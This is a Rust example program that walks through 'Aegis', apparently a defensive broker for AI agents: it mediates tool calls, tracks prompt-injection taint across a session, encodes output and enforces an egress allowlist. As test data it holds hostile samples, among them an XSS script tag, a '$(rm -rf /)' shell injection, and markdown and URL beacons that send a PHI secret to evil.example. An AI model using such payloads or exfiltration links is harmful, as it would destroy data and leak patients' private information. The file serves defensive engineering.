//! End-to-end Aegis Phase-0 walkthrough.
//!
//! Wires the broker + output + egress together and narrates each decision, using the *shipped*
//! policy artifacts in `policies/`. The star of the show is the **trifecta accumulation**: a
//! clean sensitive read is allowed on its own, but once the same session has ingested untrusted
//! content the identical read is escalated to a human — because Rule-of-Two taint accumulates
//! and cannot be cleared.
//!
//! Run it:
//! ```bash
//! CARGO_TARGET_DIR=/tmp/aegis-target cargo run -p aegis-extension --example agent_loop
//! ```

use aegis_broker::registry::ToolCall;
use aegis_broker::{Broker, Decision, Session};
use aegis_core::Provenance;
use aegis_egress::{Allowlist, EgressDecision};
use aegis_output::{encode, neutralize_exfil, validate, Sink};

fn policy(name: &str) -> String {
    let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../policies")
        .join(name);
    std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("cannot read {}: {e}", path.display()))
}

/// Pretty-print a broker decision with a leading marker.
fn show(label: &str, decision: &Decision) {
    let marker = match decision {
        Decision::Allow => "✅ ALLOW       ",
        Decision::HumanApprove => "🧑 HUMAN-APPROVE",
        Decision::Deny(_) => "⛔ DENY        ",
    };
    let detail = match decision {
        Decision::Deny(reason) => format!(" ({reason})"),
        _ => String::new(),
    };
    println!("  {marker}  {label}{detail}");
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let broker = Broker::from_sources(
        &policy("tools.example.json"),
        &policy("broker.example.cedar"),
    )?;
    println!(
        "Loaded broker: {} tools, {} Cedar policies\n",
        broker.registry().len(),
        broker.engine().len()
    );

    // ── 1. Broker: the capability-mediation gate ──────────────────────────────────────────
    println!("① Broker — every tool call is mediated in code, never by asking the model");

    // A clean, user-provenance read of sensitive data. Single leg (B), reversible -> allowed.
    let mut s = Session::new("care-assistant", "run-1", "thread-1");
    let read = ToolCall::new(
        "db.read_patient",
        serde_json::json!({"patient_id": "abc-123"}),
        Provenance::User,
    );
    show(
        "clean patient read (fresh session)",
        &broker.mediate(&mut s, &read),
    );

    // The SAME read, but the arguments themselves are untrusted -> Cedar forbids it outright.
    let mut s = Session::new("care-assistant", "run-2", "thread-2");
    let tainted_read = ToolCall::new(
        "db.read_patient",
        serde_json::json!({"patient_id": "abc-123"}),
        Provenance::Untrusted,
    );
    show(
        "patient read with untrusted-provenance args",
        &broker.mediate(&mut s, &tainted_read),
    );

    // An irreversible external effect on its own -> escalated to a human by graduated enforcement.
    let mut s = Session::new("care-assistant", "run-3", "thread-3");
    let email = ToolCall::new(
        "email.send",
        serde_json::json!({"to": "a@b.com", "subject": "hi", "body": "there"}),
        Provenance::User,
    );
    show(
        "send email (fresh session)",
        &broker.mediate(&mut s, &email),
    );

    // Malformed arguments are denied before any effect and before any taint is recorded.
    let mut s = Session::new("care-assistant", "run-4", "thread-4");
    let bad = ToolCall::new(
        "web.fetch",
        serde_json::json!({"wrong": "field"}),
        Provenance::User,
    );
    show(
        "web.fetch with bad arguments",
        &broker.mediate(&mut s, &bad),
    );

    // A tool that is not in the registry fails closed.
    let mut s = Session::new("care-assistant", "run-5", "thread-5");
    let unknown = ToolCall::new(
        "os.delete_everything",
        serde_json::json!({}),
        Provenance::User,
    );
    show(
        "call to an unregistered tool",
        &broker.mediate(&mut s, &unknown),
    );

    // ── 2. The trifecta: taint accumulates across calls within ONE session ─────────────────
    println!("\n② Rule of Two — the lethal trifecta accumulates within a session");
    let mut s = Session::new("care-assistant", "run-6", "thread-6");

    // (C) fetch untrusted web content: sets untrusted + external-effect legs. Still allowed.
    let fetch = ToolCall::new(
        "web.fetch",
        serde_json::json!({"url": "https://example.com/notes"}),
        Provenance::Untrusted,
    );
    show(
        "fetch untrusted web content",
        &broker.mediate(&mut s, &fetch),
    );
    println!(
        "     session legs now: untrusted={} sensitive={} external={}",
        s.cap.reads_untrusted, s.cap.reads_sensitive, s.cap.external_effect
    );

    // (B) now the SAME clean read as step 1 — but this session is already tainted A+C, so
    //     adding B completes the trifecta and the identical call is escalated to a human.
    let read_again = ToolCall::new(
        "db.read_patient",
        serde_json::json!({"patient_id": "abc-123"}),
        Provenance::User,
    );
    show(
        "the same clean patient read — now in a tainted session",
        &broker.mediate(&mut s, &read_again),
    );
    println!(
        "     is_trifecta = {}  (a fooled model reaches nothing here)",
        s.cap.is_trifecta()
    );

    // ── 3. Output handling: everything leaving the model is validated + sink-encoded ───────
    println!("\n③ Output — validate, then context-aware sink-encode (never a second LLM call)");
    let schema = serde_json::json!({
        "type": "object",
        "properties": { "verdict": { "enum": ["approve", "deny"] } },
        "required": ["verdict"], "additionalProperties": false
    });
    println!(
        "  schema-valid {{verdict:approve}} : {}",
        validate(&schema, &serde_json::json!({"verdict": "approve"})).is_ok()
    );
    println!(
        "  schema-valid {{verdict:sudo}}    : {}",
        validate(&schema, &serde_json::json!({"verdict": "sudo"})).is_ok()
    );

    let hostile = "<script>steal()</script>";
    println!("  HTML-encoded  : {}", encode(Sink::Html, hostile)?);
    println!("  Shell-encoded : {}", encode(Sink::Shell, "$(rm -rf /)")?);

    let md = "see ![pic](https://evil.example/beacon?exfil=PHI_SECRET)";
    let clean = neutralize_exfil(md);
    println!(
        "  exfil-neutralized markdown : {}  ({} construct[s] disarmed)",
        clean.content, clean.neutralized
    );

    // ── 4. Egress: default-deny allowlist + query-param stripping ──────────────────────────
    println!("\n④ Egress — default-deny allowlist; data-bearing query params stripped");
    let allow = Allowlist::from_toml(&policy("egress-allowlist.example.toml"))?;
    for url in [
        "https://api.internal.example/v1?page=2&leak=PHI_SECRET",
        "https://evil.example/collect?data=PHI_SECRET",
        "http://api.internal.example/v1",
    ] {
        match allow.decide(url) {
            EgressDecision::Allow(sanitized) => {
                println!("  ✅ allow  {url}\n            -> {sanitized}")
            }
            EgressDecision::Deny(reason) => println!("  ⛔ deny   {url}  ({reason})"),
        }
    }

    println!(
        "\nDone. A fooled model can only ever *request* — the broker, output, and egress decide."
    );
    Ok(())
}
